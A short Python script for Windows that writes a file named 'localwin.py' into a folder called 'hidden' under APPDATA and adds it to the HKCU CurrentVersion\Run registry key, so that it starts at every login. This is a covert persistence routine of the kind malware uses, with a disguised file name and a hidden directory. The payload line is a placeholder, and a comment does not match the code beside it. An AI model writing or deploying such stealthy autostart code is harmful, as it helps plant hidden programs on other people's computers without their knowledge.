import os
import winreg

# Replace "path/to/script.py" with the actual path to the script you want to copy
src = "import neuralnetworkAI"

# Write the script code to a file
hidden_dir = os.path.join(os.environ["APPDATA"], "hidden")
if not os.path.exists(hidden_dir):
    os.mkdir(hidden_dir)
with open(os.path.join(hidden_dir, "localwin.py"), "w") as f:
    f.write(src)

# Add the script to the startup process
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "localwin", 0, winreg.REG_SZ, os.path.join(hidden_dir, "localwin.py"))
key.Close()
print(hidden_dir)